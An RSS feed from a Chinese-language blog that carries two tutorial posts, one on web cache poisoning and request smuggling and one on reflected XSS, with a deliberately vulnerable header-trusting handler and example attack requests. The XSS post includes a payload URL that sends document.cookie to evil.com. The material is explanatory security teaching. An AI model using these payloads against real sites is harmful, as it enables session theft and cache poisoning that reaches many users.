@@ -1,0 +1,1455 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>计算机网络 on 为霜的博客</title>
+    <link>https://blog.jiyi27.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</link>
+    <description>Recent content in 计算机网络 on 为霜的博客</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Sun, 13 Apr 2025 00:02:28 +0000</lastBuildDate><atom:link href="https://blog.jiyi27.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>缓存投毒</title>
+      <link>https://blog.jiyi27.com/posts/networking/011-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/</link>
+      <pubDate>Sun, 13 Apr 2025 00:02:28 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/011-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/</guid>
+      <description>&lt;h2 id=&#34;1-缓存投毒-web-cache-posioning&#34;&gt;1. 缓存投毒 Web Cache Posioning&lt;/h2&gt;
+&lt;h3 id=&#34;11-基础概念&#34;&gt;1.1. 基础概念&lt;/h3&gt;
+&lt;p&gt;Web 缓存投毒攻击的核心在于: 攻击者找到一种方法, 让&lt;strong&gt;缓存系统存储并向其他用户提供恶意内容&lt;/strong&gt;, 在 CDN 场景中, 这种攻击尤为危险:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;CDN 服务于大量用户&lt;/li&gt;
+&lt;li&gt;缓存内容可能持续较长时间&lt;/li&gt;
+&lt;li&gt;影响范围广泛且难以快速修复&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;这里说的缓存就是上面我们讨论的 CDN, 简单来说, 当一个用户访问了例如 &lt;code&gt;/static/test.png&lt;/code&gt;, Cache 服务将会缓存, 之后再有用户访问相同的资源时, Cache服务将不会转发此请求至后端服务器, 而是直接将其保存的对应的数据返回, 那这里有个题外话, CDN 判断两个请求是否相同的依据是什么?  答案是 缓存建, 缓存键通常由以下部分组成：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;URL 路径&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;主机名&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;某些特定的请求头（如 Accept-Encoding）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查询参数（可配置是否包含）&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;用户请求 → CDN 边缘节点 → 检查缓存键 → 缓存命中返回内容/缓存未命中从源站获取
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;有一种简单的方式是基于 url 以及 host 头时, 那么缓存服务器将简单地认为下两个请求是等同的:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-2a6758f3b2d64ef5bb71ba1601101d35.r2.dev/blogs/2025/04/ec33be3d6c3fc5ddd2905f29256ec613.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到, 橙色字体将是缓存服务器判断的根据, 所以缓存服务器将会把第一个请求的响应拿来作为第二个请求的响应,&lt;/p&gt;
+&lt;h3 id=&#34;12-简单例子&#34;&gt;1.2. 简单例子&lt;/h3&gt;
+&lt;p&gt;举个例子: &lt;strong&gt;利用未验证的 HTTP 头&lt;/strong&gt; 假设有一个电商网站 ⁠&lt;code&gt;shop.example.com&lt;/code&gt;, 使用 CDN 加速内容分发, 该网站有一个功能, 根据用户的地理位置显示不同的促销信息, 网站后端代码:&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-缓存投毒-web-cache-posioning&#34;&gt;1. 缓存投毒 Web Cache Posioning&lt;/h2&gt;
+&lt;h3 id=&#34;11-基础概念&#34;&gt;1.1. 基础概念&lt;/h3&gt;
+&lt;p&gt;Web 缓存投毒攻击的核心在于: 攻击者找到一种方法, 让&lt;strong&gt;缓存系统存储并向其他用户提供恶意内容&lt;/strong&gt;, 在 CDN 场景中, 这种攻击尤为危险:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;CDN 服务于大量用户&lt;/li&gt;
+&lt;li&gt;缓存内容可能持续较长时间&lt;/li&gt;
+&lt;li&gt;影响范围广泛且难以快速修复&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;这里说的缓存就是上面我们讨论的 CDN, 简单来说, 当一个用户访问了例如 &lt;code&gt;/static/test.png&lt;/code&gt;, Cache 服务将会缓存, 之后再有用户访问相同的资源时, Cache服务将不会转发此请求至后端服务器, 而是直接将其保存的对应的数据返回, 那这里有个题外话, CDN 判断两个请求是否相同的依据是什么?  答案是 缓存建, 缓存键通常由以下部分组成：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;URL 路径&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;主机名&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;某些特定的请求头（如 Accept-Encoding）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查询参数（可配置是否包含）&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;用户请求 → CDN 边缘节点 → 检查缓存键 → 缓存命中返回内容/缓存未命中从源站获取
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;有一种简单的方式是基于 url 以及 host 头时, 那么缓存服务器将简单地认为下两个请求是等同的:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-2a6758f3b2d64ef5bb71ba1601101d35.r2.dev/blogs/2025/04/ec33be3d6c3fc5ddd2905f29256ec613.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到, 橙色字体将是缓存服务器判断的根据, 所以缓存服务器将会把第一个请求的响应拿来作为第二个请求的响应,&lt;/p&gt;
+&lt;h3 id=&#34;12-简单例子&#34;&gt;1.2. 简单例子&lt;/h3&gt;
+&lt;p&gt;举个例子: &lt;strong&gt;利用未验证的 HTTP 头&lt;/strong&gt; 假设有一个电商网站 ⁠&lt;code&gt;shop.example.com&lt;/code&gt;, 使用 CDN 加速内容分发, 该网站有一个功能, 根据用户的地理位置显示不同的促销信息, 网站后端代码:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; 服务器端代码
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;app&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/promotions&amp;#39;&lt;/span&gt;, (req, res) &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; 从 X&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Forwarded&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Host 头获取主机名&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;，&lt;/span&gt;用于构建资源 URL
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  const host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; req&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;headers[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x-forwarded-host&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;shop.example.com&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; 返回包含动态脚本引用的 HTML
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  res&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;html&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;head&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;title&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;Today&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s Promotions&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;script src&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://$&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{host}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/scripts/promo.js&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;script&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;head&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;body&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;h1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;Special Offers&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;h1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; 页面内容 &lt;span style=&#34;color:#f92672&#34;&gt;--&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;body&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;html&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;攻击者发现 &lt;code&gt;⁠X-Forwarded-Host&lt;/code&gt; 头被直接用于构建脚本 URL, 但这个头不是缓存键的一部分, 于是发送以下请求:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /promotions HTTP/1.1
+Host: shop.example.com
+X-Forwarded-Host: malicious-site.com
+User-Agent: Mozilla/5.0 ...
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;服务器生成包含 ⁠&lt;code&gt;&amp;lt;script src=&amp;quot;https://malicious-site.com/scripts/promo.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; 的响应&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;CDN 缓存这个响应，但缓存键中不包含 ⁠&lt;code&gt;X-Forwarded-Host&lt;/code&gt; 头&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;所有后续访问 ⁠&lt;code&gt;/promotions&lt;/code&gt; 的用户都会加载攻击者控制的 JavaScript&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;13-实际案例-akamai-cdn-缓存投毒2019&#34;&gt;1.3. 实际案例 Akamai CDN 缓存投毒（2019）&lt;/h3&gt;
+&lt;p&gt;研究人员发现 Akamai CDN 配置中的一个问题, 允许攻击者通过操纵 HTTP 请求, 将恶意内容注入缓存:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;POST &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;search HTTP&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host: vulnerable&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;site&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Type: application&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;urlencoded
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;testGET &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;search&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;?&lt;/span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;lt;&lt;/span&gt;script&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;alert(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;XSS&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;script&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; HTTP&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;X&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Ignore: X
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;两个 Content-Length 头&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;第一个声明内容长度为 128 字节&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;第二个声明内容长度为 4 字节&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;CDN 的处理&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Akamai CDN 可能使用第二个 ⁠Content-Length: 4&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;因此 CDN 只将 ⁠&lt;code&gt;q=test&lt;/code&gt; 作为请求体，认为请求到此结束&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;源站服务器的处理&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;源站可能使用第一个 ⁠Content-Length: 128&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;将整个内容视为一个请求体&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;但在处理后，剩余的内容 ⁠&lt;code&gt;GET /search?q=&amp;lt;script&amp;gt;alert(&#39;XSS&#39;)&amp;lt;/script&amp;gt; HTTP/1.1...&lt;/code&gt; 被解释为第二个请求&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;缓存污染&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;源站对第二个&lt;strong&gt;走私请求&lt;/strong&gt;的响应（包含 XSS 脚本）可能被 CDN 缓存&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;CDN 使用 URL 路径 ⁠&lt;code&gt;/search?q=&amp;lt;script&amp;gt;alert(&#39;XSS&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt; 作为缓存键&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;后续用户访问 ⁠&lt;code&gt;/search&lt;/code&gt; 时可能会收到包含 XSS 的缓存响应&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;部分参考: &lt;a href=&#34;https://ph4ntonn.github.io/Web-Cache-Poisoning&#34;&gt;https://ph4ntonn.github.io/Web-Cache-Poisoning&lt;/a&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>XSS Attack</title>
+      <link>https://blog.jiyi27.com/posts/networking/009-xss-attack/</link>
+      <pubDate>Sat, 12 Apr 2025 23:58:57 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/009-xss-attack/</guid>
+      <description>&lt;h2 id=&#34;1-xss-攻击&#34;&gt;1. XSS 攻击&lt;/h2&gt;
+&lt;p&gt;XSS（Cross-Site Scripting, 跨站脚本攻击）是一种常见的 Web 安全漏洞, 攻击者通过在网页中注入恶意脚本代码, 当其他用户浏览该页面时, 这些恶意脚本会在用户的浏览器中执行, 从而实现窃取用户信息、会话劫持等攻击目的,&lt;/p&gt;
+&lt;h3 id=&#34;11-反射型-xss-reflected-xss&#34;&gt;1.1. 反射型 XSS (Reflected XSS)&lt;/h3&gt;
+&lt;p&gt;反射型 XSS 是一种非持久性跨站脚本攻击, 攻击者通过诱导用户点击包含恶意脚本的链接, 将恶意代码注入到目标网站的页面中, 恶意脚本通过用户的请求（通常是 URL 参数）被“反射”到服务器的响应中, 并在用户的浏览器中执行,&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;攻击者构造一个包含恶意脚本的 URL（通常通过 GET 参数传递）&lt;/li&gt;
+&lt;li&gt;用户被诱导点击该 URL（例如通过钓鱼邮件或社交工程）&lt;/li&gt;
+&lt;li&gt;服务器接收到请求后，未经充分过滤或转义就将用户输入（包含恶意脚本）直接嵌入到响应页面中&lt;/li&gt;
+&lt;li&gt;浏览器收到响应后，执行页面中的恶意脚本，导致攻击生效&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;假设有一个简单的搜索网站 &lt;code&gt;example.com&lt;/code&gt;, 用户可以在页面上输入搜索关键词, 服务器会将关键词显示在结果页面上, 例如, 用户输入 apple, URL 会变成 &lt;code&gt;http://example.com/search?q=apple&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;结果页面会显示:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;您搜索了：apple
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果服务器没有对用户输入 q 参数进行过滤或转义, 攻击者可以构造一个恶意 URL:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://example.com/search?q=&amp;lt;script&amp;gt;alert(&amp;#39;Hacked!&amp;#39;);&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当用户点击这个链接时，服务器会将 &lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;Hacked!&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt; 直接嵌入到响应页面中，生成如下 HTML:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  您搜索了：&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Hacked!&amp;#39;&lt;/span&gt;);&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用户的浏览器会解析并执行这个脚本，弹出一个提示框显示 Hacked!&lt;/p&gt;
+&lt;p&gt;攻击者可能不仅仅是弹窗, 而是窃取用户的 Cookie 或重定向到恶意网站, 例如, 构造如下 URL:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://example.com/search?q=&amp;lt;script&amp;gt;document.location=&amp;#39;http://evil.com/steal?cookie=&amp;#39;+document.cookie;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当用户点击后，浏览器会执行脚本，将用户的 Cookie 发送到攻击者的服务器 &lt;code&gt;evil.com&lt;/code&gt;&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-xss-攻击&#34;&gt;1. XSS 攻击&lt;/h2&gt;
+&lt;p&gt;XSS（Cross-Site Scripting, 跨站脚本攻击）是一种常见的 Web 安全漏洞, 攻击者通过在网页中注入恶意脚本代码, 当其他用户浏览该页面时, 这些恶意脚本会在用户的浏览器中执行, 从而实现窃取用户信息、会话劫持等攻击目的,&lt;/p&gt;
+&lt;h3 id=&#34;11-反射型-xss-reflected-xss&#34;&gt;1.1. 反射型 XSS (Reflected XSS)&lt;/h3&gt;
+&lt;p&gt;反射型 XSS 是一种非持久性跨站脚本攻击, 攻击者通过诱导用户点击包含恶意脚本的链接, 将恶意代码注入到目标网站的页面中, 恶意脚本通过用户的请求（通常是 URL 参数）被“反射”到服务器的响应中, 并在用户的浏览器中执行,&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;攻击者构造一个包含恶意脚本的 URL（通常通过 GET 参数传递）&lt;/li&gt;
+&lt;li&gt;用户被诱导点击该 URL（例如通过钓鱼邮件或社交工程）&lt;/li&gt;
+&lt;li&gt;服务器接收到请求后，未经充分过滤或转义就将用户输入（包含恶意脚本）直接嵌入到响应页面中&lt;/li&gt;
+&lt;li&gt;浏览器收到响应后，执行页面中的恶意脚本，导致攻击生效&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;假设有一个简单的搜索网站 &lt;code&gt;example.com&lt;/code&gt;, 用户可以在页面上输入搜索关键词, 服务器会将关键词显示在结果页面上, 例如, 用户输入 apple, URL 会变成 &lt;code&gt;http://example.com/search?q=apple&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;结果页面会显示:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;您搜索了：apple
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果服务器没有对用户输入 q 参数进行过滤或转义, 攻击者可以构造一个恶意 URL:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://example.com/search?q=&amp;lt;script&amp;gt;alert(&amp;#39;Hacked!&amp;#39;);&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当用户点击这个链接时，服务器会将 &lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;Hacked!&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt; 直接嵌入到响应页面中，生成如下 HTML:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  您搜索了：&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Hacked!&amp;#39;&lt;/span&gt;);&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用户的浏览器会解析并执行这个脚本，弹出一个提示框显示 Hacked!&lt;/p&gt;
+&lt;p&gt;攻击者可能不仅仅是弹窗, 而是窃取用户的 Cookie 或重定向到恶意网站, 例如, 构造如下 URL:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://example.com/search?q=&amp;lt;script&amp;gt;document.location=&amp;#39;http://evil.com/steal?cookie=&amp;#39;+document.cookie;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当用户点击后，浏览器会执行脚本，将用户的 Cookie 发送到攻击者的服务器 &lt;code&gt;evil.com&lt;/code&gt;&lt;/p&gt;
